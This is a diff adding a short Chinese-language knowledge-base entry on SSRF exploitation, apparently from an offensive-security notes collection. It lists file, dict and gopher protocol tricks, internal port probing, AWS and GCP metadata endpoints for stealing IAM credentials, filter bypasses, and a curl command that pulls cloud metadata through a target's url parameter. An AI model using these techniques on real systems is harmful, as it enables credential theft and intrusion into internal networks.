@@ -1,0 +1,15 @@
+{
+  "id": "kb006",
+  "title": "SSRF 利用",
+  "description": "协议升级 gopher 打内网 + 云元数据拿凭据",
+  "detail": "可控点：url 参数、webhook、导入功能、图片加载。\n协议：file:///etc/passwd、dict://、gopher://（构造 mysql/redis/http 精确报文）。\n内网：先探测 127.0.0.1 与常见网段端口（redis 6379 / mysql 3306 / 管理台）。\n云元数据（拿到就是王炸）：\n- AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n- GCP: /computeMetadata/v1/ 需头 Metadata-Flavor: Google\n绕过：302 跳转、dns rebinding、十进制 IP、xip.io/nip.io。",
+  "commands": [
+    "curl 'http://T/fetch?url=http://169.254.169.254/latest/meta-data/'"
+  ],
+  "tags": [
+    "web",
+    "ssrf"
+  ],
+  "source": "经验/hacktricks",
+  "created_at": "2026-10-15T13:44:05Z"
+}
